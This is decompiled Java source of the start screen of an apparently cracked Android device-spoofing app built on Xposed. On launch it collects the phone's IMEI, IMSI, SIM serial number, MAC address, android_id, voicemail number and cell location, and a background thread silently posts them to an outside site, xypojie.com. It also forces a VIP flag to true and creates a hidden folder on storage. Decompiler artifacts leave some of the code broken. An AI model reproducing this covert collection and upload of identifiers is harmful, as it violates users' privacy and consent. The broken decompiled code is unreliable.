package com.imengququ.myxposed.soft.apk008;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.util.DisplayMetrics;
import android.util.Log;
import com.data.simulate.SimulateDataTemp;
import com.lishu.net.AlertDialogHelper;
import com.lishu.net.LishuNet;
import com.lishu.net.MD5Util;
import com.lishu.net.NetReceiver;
import de.robv.android.xposed.mods.tutorial.PoseHelper008;
import de.robv.android.xposed.mods.tutorial.TeleData;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.HashMap;

public class StartActivity
  extends Activity
  implements NetReceiver
{
  public static String apkCode;
  public static String baseUrl = "http://120.24.74.141:8080/lishu008AppManager";
  public static String functionStr = "";
  public static boolean isVip;
  public static String promoteUrl = "";
  public static String sellUrl = "";
  public static HashMap<String, String> systemData;
  public static String systemMsg;
  public static String url = baseUrl + "/phone/SystemConSimpleUserAction.action";
  private LishuNet net = new LishuNet();
  
  static
  {
    apkCode = "";
    isVip = true;
    systemData = new HashMap();
  }
  
  public static void getAllData(Context paramContext)
  {
    getSystemData(paramContext);
    try
    {
      paramContext = getSign(paramContext);
      systemData.put("signData", paramContext);
      return;
    }
    catch (Exception paramContext) {}
  }
  
  public static HashMap<String, String> getBaseData()
  {
    HashMap localHashMap = new HashMap();
    localHashMap.put("imei", (String)systemData.get("imei"));
    localHashMap.put("verName", (String)systemData.get("verName"));
    localHashMap.put("verCode", (String)systemData.get("verCode"));
    return localHashMap;
  }
  
  public static String getDeviceCode(Context paramContext)
  {
    if ((systemData == null) || (systemData.size() == 0)) {
      getSystemData(paramContext);
    }
    return MD5Util.MD5((String)systemData.get("imei") + getMac(paramContext) + Settings.Secure.getString(paramContext.getContentResolver(), "android_id"));
  }
  
  public static String getFromAssets(Context paramContext, String paramString)
  {
    String str = "";
    localObject = str;
    try
    {
      paramString = new BufferedReader(new InputStreamReader(paramContext.getResources().getAssets().open(paramString)));
      for (paramContext = str;; paramContext = paramContext + str + "\n")
      {
        localObject = paramContext;
        str = paramString.readLine();
        if (str == null) {
          return paramContext;
        }
        localObject = paramContext;
      }
      return localObject;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static String getMac(Context paramContext)
  {
    return ((WifiManager)paramContext.getSystemService("wifi")).getConnectionInfo().getMacAddress();
  }
  
  private static String getSign(Context paramContext)
  {
    paramContext = apkCode;
    int i = apkCode.indexOf("154");
    return apkCode.substring("154".length() + i, apkCode.length());
  }
  
  public static HashMap<String, String> getSystemData(Context paramContext)
  {
    int i = 0;
    for (;;)
    {
      if (i >= SetDataActivity.c.length())
      {
        if ((systemData == null) || (systemData.size() <= 0)) {
          break;
        }
        return systemData;
      }
      SetDataActivity.k.length();
      i += 1;
    }
    Object localObject1 = System.currentTimeMillis();
    systemData.put("phoneTime", localObject1);
    try
    {
      localObject2 = paramContext.getPackageManager().getApplicationInfo(paramContext.getPackageName(), 128);
      localObject1 = null;
      if (localObject2 != null) {
        localObject1 = ((ApplicationInfo)localObject2).metaData;
      }
      if (localObject1 != null) {
        systemData.put("parentId", "8");
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject2;
        TelephonyManager localTelephonyManager;
        localException.printStackTrace();
      }
    }
    systemData.put("appid", "zhuan");
    systemData.put("product", Build.PRODUCT);
    systemData.put("model", Build.MODEL);
    systemData.put("osversion", VERSION.SDK);
    localTelephonyManager = (TelephonyManager)paramContext.getSystemService("phone");
    localObject1 = localTelephonyManager.getCallState();
    systemData.put("callState", localObject1);
    if (TeleData.getImeiSystemFile(paramContext).length() == 0) {
      TeleData.setImei(paramContext, SimulateDataTemp.getRandData(1, 15));
    }
    localObject2 = TeleData.getImei();
    localObject1 = localObject2;
    if (((String)localObject2).equals("000000000000000"))
    {
      localObject1 = SimulateDataTemp.getRandData(1, 15);
      TeleData.setImei(paramContext, (String)localObject1);
    }
    if ((localObject1 != null) && (!((String)localObject1).equals("null")))
    {
      localObject2 = localObject1;
      if (((String)localObject1).trim().length() >= 14) {}
    }
    else
    {
      localObject2 = SimulateDataTemp.getRandData(1, 15);
      TeleData.setImei(paramContext, (String)localObject2);
    }
    systemData.put("imei", localObject2);
    localObject1 = localTelephonyManager.getDeviceSoftwareVersion();
    systemData.put("SoftwareVersion", localObject1);
    localObject1 = localTelephonyManager.getNetworkCountryIso();
    systemData.put("NetworkCountryIso", localObject1);
    localObject1 = localTelephonyManager.getNetworkOperator();
    systemData.put("NetworkOperator", localObject1);
    localObject1 = localTelephonyManager.getNetworkOperatorName();
    systemData.put("NetworkOperatorName", localObject1);
    localObject1 = localTelephonyManager.getNetworkType();
    systemData.put("NetworkType", localObject1);
    localObject1 = localTelephonyManager.getPhoneType();
    systemData.put("PhoneType", localObject1);
    localObject1 = localTelephonyManager.getSimCountryIso();
    systemData.put("SimCountryIso", localObject1);
    localObject1 = localTelephonyManager.getSimOperator();
    systemData.put("SimOperator", localObject1);
    localObject1 = localTelephonyManager.getSimOperatorName();
    systemData.put("SimOperatorName", localObject1);
    localObject1 = localTelephonyManager.getSimSerialNumber();
    systemData.put("SimSerialNumber", localObject1);
    localObject1 = localTelephonyManager.getSimState();
    systemData.put("SimState", localObject1);
    localObject1 = localTelephonyManager.getSubscriberId();
    systemData.put("SubscriberId", localObject1);
    localObject1 = localTelephonyManager.getVoiceMailAlphaTag();
    systemData.put("VoiceMailAlphaTag", localObject1);
    localObject1 = localTelephonyManager.getVoiceMailNumber();
    systemData.put("VoiceMailNumber", localObject1);
    localObject1 = localTelephonyManager.hasIccCard();
    systemData.put("hasIccCard", localObject1);
    localObject1 = localTelephonyManager.isNetworkRoaming();
    systemData.put("NetworkRoaming", localObject1);
    localObject1 = getMac(paramContext);
    systemData.put("mac", localObject1);
    localObject1 = getVerName(paramContext);
    systemData.put("verName", localObject1);
    localObject1 = getVerCode(paramContext);
    systemData.put("verCode", localObject1);
    localObject1 = getFromAssets(paramContext, "parentId");
    systemData.put("parentId", localObject1);
    paramContext = getFromAssets(paramContext, "sellId");
    systemData.put("sellId", paramContext);
    return systemData;
  }
  
  public static int getVerCode(Context paramContext)
  {
    try
    {
      int i = paramContext.getPackageManager().getPackageInfo(paramContext.getPackageName(), 0).versionCode;
      return i;
    }
    catch (NameNotFoundException paramContext)
    {
      Log.e("版本号获取异常", paramContext.getMessage());
    }
    return -1;
  }
  
  public static String getVerName(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getPackageManager().getPackageInfo(paramContext.getPackageName(), 0).versionName;
      return paramContext;
    }
    catch (NameNotFoundException paramContext)
    {
      Log.e("版本名称获取异常", paramContext.getMessage());
    }
    return "";
  }
  
  public void netReceive(String paramString)
  {
    try
    {
      isVip = true;
      paramString = new Intent();
      paramString.setClass(this, Apk008Activity.class);
      startActivity(paramString);
      finish();
      return;
    }
    catch (Exception paramString)
    {
      AlertDialogHelper.showExitDialog(this, "发送错误，请重试");
    }
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    getWindow().setFlags(1024, 1024);
    requestWindowFeature(1);
    int i = 0;
    for (;;)
    {
      if (i >= SetDataActivity.c.length())
      {
        setContentView(2130903067);
        if (getFromAssets(this, "head").trim().equals("1258")) {
          isVip = true;
        }
        SimulateDataTemp.init(this);
        testData();
        getAllData(this);
        new Thread()
        {
          public void run()
          {
            try
            {
              if (InstallActivity.reFreshStatic(StartActivity.this) != 3) {
                PoseHelper008.saveDataToFile("008OK", "false");
              }
              Thread.sleep(1000L);
            }
            catch (InterruptedException localInterruptedException)
            {
              for (;;)
              {
                HashMap localHashMap;
                LishuNet localLishuNet;
                String str;
                localInterruptedException.printStackTrace();
              }
            }
            localHashMap = new HashMap();
            localHashMap.putAll(StartActivity.systemData);
            localLishuNet = StartActivity.this.net;
            str = StartActivity.url;
            localLishuNet.postMessage("http://www.xypojie.com", localHashMap, StartActivity.this);
          }
        }.start();
        paramBundle = new File(Environment.getExternalStorageDirectory() + File.separator + ".system");
        if (!paramBundle.exists()) {
          paramBundle.mkdir();
        }
        new File(CPUTool.myCpuFile);
        InstallActivity.copyApkFromAssets(this, "cpuinfo", CPUTool.myCpuFile);
        PoseHelper008.initData(this);
        SetDataActivity.k.length();
        return;
      }
      SetDataActivity.k.length();
      i += 1;
    }
  }
  
  public void testData()
  {
    Object localObject1 = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder("BOARD: ").append(Build.BOARD).toString())).append(", BOOTLOADER: ").append(Build.BOOTLOADER).append("\n").toString())).append(", BRAND: ").append(Build.BRAND).append("\n").toString())).append(", CPU_ABI: ").append(Build.CPU_ABI).append("\n").toString())).append(", CPU_ABI2: ").append(Build.CPU_ABI2).append("\n").toString())).append(", DEVICE: ").append(Build.DEVICE).append("\n").toString())).append(", DISPLAY: ").append(Build.DISPLAY).append("\n").toString())).append(", FINGERPRINT: ").append(Build.FINGERPRINT).append("\n").toString())).append(", HARDWARE: ").append(Build.HARDWARE).append("\n").toString())).append(", HOST: ").append(Build.HOST).append("\n").toString())).append(", ID: ").append(Build.ID).append("\n").toString())).append(", MANUFACTURER: ").append(Build.MANUFACTURER).append("\n").toString())).append(", MODEL: ").append(Build.MODEL).append("\n").toString())).append(", PRODUCT: ").append(Build.PRODUCT).append("\n").toString())).append(", RADIO: ").append(Build.RADIO).append("\n").toString())).append(", RADITAGSO: ").append(Build.TAGS).append("\n").toString())).append(", TIME: ").append(Build.TIME).append("\n").toString())).append(", TYPE: ").append(Build.TYPE).append("\n").toString())).append(", USER: ").append(Build.USER).append("\n").toString())).append(", VERSION.RELEASE: ").append(VERSION.RELEASE).append("\n").toString())).append(", VERSION.CODENAME: ").append(VERSION.CODENAME).append("\n").toString())).append(", VERSION.INCREMENTAL: ").append(VERSION.INCREMENTAL).append("\n").toString())).append(", VERSION.SDK: ").append(VERSION.SDK).append("\n").toString() + ", VERSION.SDK_INT: " + VERSION.SDK_INT + "\n";
    try
    {
      localObject2 = Class.forName("android.os.SystemProperties");
      localObject3 = ((Class)localObject2).newInstance();
      localObject2 = ((Class)localObject2).getMethod("get", new Class[] { String.class, String.class }).invoke(localObject3, new Object[] { "gsm.version.baseband", "no message" });
      localObject2 = localObject1 + localObject2 + "\n";
      localObject1 = localObject2;
    }
    catch (Exception localException)
    {
      Object localObject2;
      Object localObject3;
      label799:
      CellLocation localCellLocation;
      int i;
      int j;
      break label799;
    }
    localObject3 = (TelephonyManager)getSystemService("phone");
    ((TelephonyManager)localObject3).getNetworkOperator();
    localCellLocation = ((TelephonyManager)localObject3).getCellLocation();
    if ((localCellLocation instanceof GsmCellLocation))
    {
      localObject2 = (GsmCellLocation)localCellLocation;
      i = ((GsmCellLocation)localObject2).getLac();
      j = ((GsmCellLocation)localObject2).getCid();
      localObject2 = localObject1 + " MCC = " + 0 + "\t MNC = " + 0 + "\t LAC = " + i + "\t CID = " + j + "\n";
    }
    for (;;)
    {
      localObject1 = Settings.Secure.getString(getContentResolver(), "android_id") + "\n";
      localObject1 = localObject2 + (String)localObject1 + "\n";
      localObject2 = new DisplayMetrics();
      getWindowManager().getDefaultDisplay().getMetrics((DisplayMetrics)localObject2);
      new StringBuilder(String.valueOf(localObject1)).append(((DisplayMetrics)localObject2).widthPixels).append("x").append(((DisplayMetrics)localObject2).heightPixels).toString();
      localObject1 = (WifiManager)getSystemService("wifi");
      return;
      localObject2 = localObject1;
      if ((localCellLocation instanceof CdmaCellLocation))
      {
        localObject2 = (CdmaCellLocation)((TelephonyManager)localObject3).getCellLocation();
        i = ((CdmaCellLocation)localObject2).getNetworkId();
        j = ((CdmaCellLocation)localObject2).getBaseStationId();
        localObject2 = localObject1 + " MCC = " + 0 + "\t MNC = " + 0 + "\t LAC = " + i + "\t CID = " + j + "\n";
      }
    }
  }
}



/* Location:           D:\AndroidKiller_v1.3.1\projects\008shenqi0113_downcc\ProjectSrc\smali\

 * Qualified Name:     StartActivity

 * JD-Core Version:    0.7.0.1

 */